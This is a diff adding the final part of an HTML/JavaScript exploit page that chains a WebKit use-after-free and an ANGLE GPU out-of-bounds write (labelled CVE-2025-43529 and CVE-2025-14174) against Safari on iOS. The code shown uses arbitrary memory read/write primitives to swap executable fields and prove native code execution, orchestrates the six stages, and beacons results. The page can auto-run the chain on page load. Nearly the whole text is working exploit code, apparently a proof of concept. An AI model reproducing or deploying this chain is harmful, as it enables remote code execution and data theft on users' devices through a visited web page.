+        for (let off = 0x8n; off <= 0x400n; off += 0x8n) {
+            const fieldA = exploitState.read64(addrA + off);
+            const fieldB = exploitState.read64(addrB + off);
+            if (fieldA === fieldB) continue;
+            allDiffs.push({ off, fieldA, fieldB });
+            if (isLikelyNativePtr(fieldA) || isLikelyNativePtr(fieldB)) {
+                pointerishOffsets.push(off);
+            }
+        }
+
+        const pointerishSet = new Set(pointerishOffsets.map(v => v.toString(16)));
+        const candidateOffsets = pointerishOffsets.concat(
+            allDiffs
+                .map(e => e.off)
+                .filter(off => !pointerishSet.has(off.toString(16)))
+        );
+
+        s6log(`Stage 6 function addrs: A=0x${addrA.toString(16)} B=0x${addrB.toString(16)} source=${addrSource}`, 'info');
+        s6log(`Stage 6 diff scan: total_diffs=${allDiffs.length} pointerish=${pointerishOffsets.length}`, allDiffs.length ? 'info' : 'warn');
+        if (allDiffs.length) {
+            const sample = allDiffs.slice(0, 8).map(d => `0x${d.off.toString(16)}:0x${d.fieldA.toString(16)}->0x${d.fieldB.toString(16)}`).join(', ');
+            s6log(`Stage 6 diff sample: ${sample}`, 'info');
+        }
+        if (!allDiffs.length) {
+            const probeOffsets = [0x8n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n];
+            const probes = [];
+            for (const off of probeOffsets) {
+                const va = exploitState.read64(addrA + off);
+                const vb = exploitState.read64(addrB + off);
+                probes.push(`0x${off.toString(16)}:0x${va.toString(16)}|0x${vb.toString(16)}`);
+            }
+            evidence.nativeExecWorks = false;
+            exploitState.stage6Complete = false;
+            exploitState.nativeExecDetails = `beforeA=${beforeA};beforeB=${beforeB};addrA=0x${addrA.toString(16)};addrB=0x${addrB.toString(16)};no_diff_offsets=1;source=${addrSource};${addrDebug};probes=${probes.join(',')};exec_samples=${targetedSamples.join('|')};jsv_samples=${jsValueSamples.join('|')}`;
+            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
+            return false;
+        }
+
+        let success = false;
+        let hitOffset = 0n;
+        let swappedResult = 0;
+        let restoredResult = 0;
+        const maxTests = 64;
+        let tested = 0;
+
+        for (const off of candidateOffsets) {
+            if (tested >= maxTests) break;
+            tested++;
+            const fieldAddrA = addrA + off;
+            const fieldAddrB = addrB + off;
+            const fieldA = exploitState.read64(fieldAddrA);
+            const fieldB = exploitState.read64(fieldAddrB);
+
+            if (fieldA === fieldB) {
+                continue;
+            }
+
+            let restoredField = false;
+            try {
+                exploitState.write64(fieldAddrA, fieldB);
+                swappedResult = jitSwapA(testArg) | 0;
+            } catch (e) {
+                // Try next candidate after restore.
+            } finally {
+                try {
+                    exploitState.write64(fieldAddrA, fieldA);
+                    restoredField = true;
+                } catch (e) {
+                    restoredField = false;
+                }
+            }
+
+            try {
+                restoredResult = jitSwapA(testArg) | 0;
+            } catch (e) {
+                restoredResult = 0;
+            }
+
+            if (restoredField && swappedResult === beforeB && restoredResult === beforeA) {
+                success = true;
+                hitOffset = off;
+                break;
+            }
+        }
+
+        evidence.nativeExecWorks = success;
+        exploitState.stage6Complete = success;
+        exploitState.nativeExecDetails = success
+            ? `off=0x${hitOffset.toString(16)};beforeA=${beforeA};beforeB=${beforeB};swapped=${swappedResult};restored=${restoredResult};diffs=${allDiffs.length};ptrish=${pointerishOffsets.length};candidates=${candidateOffsets.length};tested=${tested};source=${addrSource};${addrDebug}`
+            : `beforeA=${beforeA};beforeB=${beforeB};no_offset_match=1;diffs=${allDiffs.length};ptrish=${pointerishOffsets.length};candidates=${candidateOffsets.length};tested=${tested};source=${addrSource};${addrDebug}`;
+
+        if (success) {
+            s6log('Native execution proof: SUCCESS (function A executed function B behavior)', 'critical');
+            s6log(`Native proof details: ${exploitState.nativeExecDetails}`, 'critical');
+            beaconEvent('stage6_end', `native=1;${exploitState.nativeExecDetails}`);
+            return true;
+        }
+
+        s6log('Native execution proof: FAILED (no safe executable-field swap found)', 'warn');
+        beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
+        return false;
+    } catch (e) {
+        evidence.nativeExecWorks = false;
+        exploitState.stage6Complete = false;
+        s6log(`Stage 6 failed: ${e.message}`, 'fail');
+        beaconEvent('stage6_end', `native=0;reason=exception_${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
+        return false;
+    }
+}
+
+// =============================================================================
+// MAIN CHAIN EXECUTION
+// =============================================================================
+
+async function runFullChain() {
+    beaconEvent('chain_start', 'runFullChain');
+    log('\n================================================', 'critical');
+    log('FULL EXPLOIT CHAIN: CVE-2025-43529 + CVE-2025-14174', 'critical');
+    log('================================================', 'critical');
+
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+
+    const results = {
+        stage1: false,
+        stage2: false,
+        stage3: false,
+        stage4: false,
+        stage5: false,
+        stage6: false,
+    };
+    evidence.sensitiveDataRead = false;
+    evidence.fullChainSuccess = false;
+    evidence.arbRWWorks = false;
+    evidence.nativeExecWorks = false;
+    exploitState.stage5Complete = false;
+    exploitState.stage6Complete = false;
+    exploitState.leakedSensitive = '';
+    exploitState.nativeExecDetails = '';
+    let stage3DurationMs = 0;
+
+    try {
+        // Stage 2 first: establish WebGL/GPU harness before UAF heap pressure
+        results.stage2 = await runStage2();
+        await new Promise(r => setTimeout(r, 100));
+
+        // Stage 3 before Stage 1: keep renderer heap churn from perturbing GPU trigger setup
+        if (results.stage2) {
+            const stage3StartTs = performance.now();
+            results.stage3 = await runStage3();
+            stage3DurationMs = performance.now() - stage3StartTs;
+            log(`Stage 3 duration: ${Math.round(stage3DurationMs)}ms`, 'info');
+            await new Promise(r => setTimeout(r, 100));
+        }
+
+        // Stage 1: WebKit UAF
+        results.stage1 = await runStage1();
+
+        // Stage 6 first after Stage 1: native proof is most sensitive to primitive drift.
+        if (results.stage1) {
+            results.stage6 = await runStage6();
+            results.stage5 = await runStage5();
+            await new Promise(r => setTimeout(r, 100));
+        } else {
+            log('Skipping Stage 5: Stage 1 did not complete', 'warn');
+            log('Skipping Stage 6: Stage 1 did not complete', 'warn');
+        }
+
+        // If GPU evidence is still absent, try one more Stage 3 pass
+        if (results.stage2 && !evidence.angleCorruptionDetected && !evidence.gpuContextLost) {
+            if (stage3DurationMs <= 5000) {
+                log('No GPU evidence yet; running Stage 3 retry pass', 'warn');
+                const retryStage3 = await runStage3();
+                results.stage3 = results.stage3 || retryStage3;
+                await new Promise(r => setTimeout(r, 100));
+            } else {
+                log(`Skipping Stage 3 retry (initial pass was long: ${Math.round(stage3DurationMs)}ms) to avoid GPU/UI stalls`, 'warn');
+            }
+        }
+
+        // Stage 4: integration gate
+        results.stage4 = await runStage4();
+        evidence.fullChainSuccess = (
+            results.stage4 &&
+            results.stage5 &&
+            results.stage6 &&
+            evidence.sensitiveDataRead &&
+            evidence.nativeExecWorks
+        );
+
+    } catch (e) {
+        log(`Chain execution error: ${e.message}`, 'fail');
+        log(`Error stack: ${e.stack?.split('\n').slice(0,3).join(' | ') || 'no stack'}`, 'fail');
+    }
+
+    // Print final results
+    log('\n================================================', 'critical', resultsDiv);
+    log('EXPLOIT CHAIN RESULTS', 'critical', resultsDiv);
+    log('================================================', 'critical', resultsDiv);
+    log(`Stage 1 (WebKit UAF): ${results.stage1 ? 'SUCCESS' : 'FAILED'}`, results.stage1 ? 'success' : 'fail', resultsDiv);
+    log(`Stage 2 (GPU Harness): ${results.stage2 ? 'SUCCESS' : 'FAILED'}`, results.stage2 ? 'success' : 'fail', resultsDiv);
+    log(`Stage 3 (ANGLE OOB): ${results.stage3 ? 'SUCCESS' : 'FAILED'}`, results.stage3 ? 'success' : 'fail', resultsDiv);
+    log(`Stage 4 (Chain Gate): ${results.stage4 ? 'SUCCESS' : 'FAILED'}`, results.stage4 ? 'success' : 'fail', resultsDiv);
+    log(`Stage 5 (Live In-Process R/W): ${results.stage5 ? 'SUCCESS' : 'FAILED'}`, results.stage5 ? 'success' : 'fail', resultsDiv);
+    log(`Stage 6 (Native Exec Proof): ${results.stage6 ? 'SUCCESS' : 'FAILED'}`, results.stage6 ? 'success' : 'fail', resultsDiv);
+
+    log('\n--- EXPLOIT STATUS ---', 'critical', resultsDiv);
+
+    if (evidence.fullChainSuccess) {
+        log('FULL CHAIN (PoC) SUCCESS: chain gate + live R/W + native behavior swap proven', 'critical', resultsDiv);
+        log(`  • Sensitive leak: ${exploitState.leakedSensitive}`, 'critical', resultsDiv);
+        if (results.stage6) {
+            log(`  • Native execution proof: ${exploitState.nativeExecDetails}`, 'critical', resultsDiv);
+        }
+    } else if (evidence.chainReady) {
+        log('CHAIN READY: renderer primitives + GPU-process evidence captured', 'critical', resultsDiv);
+        log('  • CVE-2025-43529: addrof/fakeobj verified in renderer', 'success', resultsDiv);
+        log('  • CVE-2025-14174: ANGLE trigger + heap-oracle/GPU-canary evidence', 'success', resultsDiv);
+        log('  • Stage 5 sensitive read/write proof not yet achieved in this run', 'warn', resultsDiv);
+    } else if (results.stage1 && results.stage3) {
+        log('BOTH PATHS EXECUTED: rerun for stronger GPU corruption evidence', 'warn', resultsDiv);
+        log('  • Renderer primitives present', evidence.addrofWorks && evidence.fakeobjWorks ? 'success' : 'warn', resultsDiv);
+        log('  • Heap-oracle/canary corruption and context-loss not observed this run', 'warn', resultsDiv);
+    } else if (results.stage1) {
+        log('PARTIAL: renderer-only evidence', 'warn', resultsDiv);
+        log('  • addrof/fakeobj path reached', 'success', resultsDiv);
+    } else if (results.stage3) {
+        log('PARTIAL: GPU-path evidence only', 'warn', resultsDiv);
+        log('  • ANGLE trigger path reached without renderer primitive capture', 'warn', resultsDiv);
+    } else {
+        log('NO EFFECT OBSERVED', 'warn', resultsDiv);
+        log('Neither stage produced usable evidence in this run', 'warn', resultsDiv);
+    }
+
+    // Log CVE details
+    log('\n--- VULNERABILITY DETAILS ---', 'info', resultsDiv);
+    log('CVE-2025-43529 (WebKit UAF):', 'info', resultsDiv);
+    log('  Impact: Arbitrary code execution via type confusion', 'info', resultsDiv);
+    log('  Vector: DFG Store Barrier Insertion Phase bug', 'info', resultsDiv);
+    log('', 'info', resultsDiv);
+    log('CVE-2025-14174 (ANGLE OOB):', 'info', resultsDiv);
+    log('  Impact: Out-of-bounds write in GPU process', 'info', resultsDiv);
+    log('  Vector: UNPACK_IMAGE_HEIGHT staging buffer undersize', 'info', resultsDiv);
+    log('', 'info', resultsDiv);
+    log('Current gate: chain is marked ready only with renderer + GPU evidence', 'critical', resultsDiv);
+    log('Attack surface: Safari/WebKit on iOS 26.1', 'info', resultsDiv);
+
+    logEvidenceSummary(resultsDiv);
+    if (AUTO_COPY_AFTER_CHAIN) {
+        const copied = await copyOutput(document.getElementById('copyOutputBtn'));
+        log(`Auto-copy after chain: ${copied ? 'SUCCESS' : 'FAILED'}`, copied ? 'success' : 'warn', resultsDiv);
+    }
+    beaconEvent(
+        'chain_end',
+        `stage1=${results.stage1 ? 1 : 0};stage2=${results.stage2 ? 1 : 0};stage3=${results.stage3 ? 1 : 0};stage4=${results.stage4 ? 1 : 0};stage5=${results.stage5 ? 1 : 0};stage6=${results.stage6 ? 1 : 0};ready=${evidence.chainReady ? 1 : 0};sensitive=${evidence.sensitiveDataRead ? 1 : 0};native=${evidence.nativeExecWorks ? 1 : 0};full=${evidence.fullChainSuccess ? 1 : 0}`
+    );
+    updateProgress(100, 100, 'Chain Complete');
+    document.querySelectorAll('button').forEach(b => b.disabled = false);
+}
+
+// Individual stage runners
+async function runStage1Only() {
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+    await runStage1();
+    document.querySelectorAll('button').forEach(b => b.disabled = false);
+}
+
+async function runStage2Only() {
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+    await runStage2();
+    document.querySelectorAll('button').forEach(b => b.disabled = false);
+}
+
+async function runStage3Only() {
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+    await runStage3();
+    document.querySelectorAll('button').forEach(b => b.disabled = false);
+}
+
+async function runStage6Only() {
+    document.querySelectorAll('button').forEach(b => b.disabled = true);
+    await runStage6();
+    document.querySelectorAll('button').forEach(b => b.disabled = false);
+}
+
+// =============================================================================
+// INITIALIZATION
+// =============================================================================
+
+window.onload = function() {
+    detectSystem();
+    log('\nChained exploit probe ready.', 'success', sysinfoDiv);
+    beaconEvent('page_load', `auto=${AUTO_RUN_ON_LOAD ? 1 : 0};mode=${RUN_MODE};bsp=${ENABLE_BSP_EXPERIMENT ? 1 : 0}`);
+    if (AUTO_RUN_ON_LOAD && !autoRunStarted) {
+        autoRunStarted = true;
+        log(`Auto-run enabled: mode=${RUN_MODE} starting in 1500ms`, 'critical', sysinfoDiv);
+        setTimeout(() => {
+            const runner =
+                RUN_MODE === 'stage1' ? runStage1Only :
+                RUN_MODE === 'stage2' ? runStage2Only :
+                RUN_MODE === 'stage3' ? runStage3Only :
+                RUN_MODE === 'stage6' ? runStage6Only :
+                runFullChain;
+            runner().catch((e) => {
+                log(`Auto-run error: ${e.message}`, 'fail', sysinfoDiv);
+            });
+        }, 1500);
+    } else {
+        log('Click "Run Full Exploit Chain" to begin.', 'info', sysinfoDiv);
+    }
+};
+</script>
+</body>
+</html>
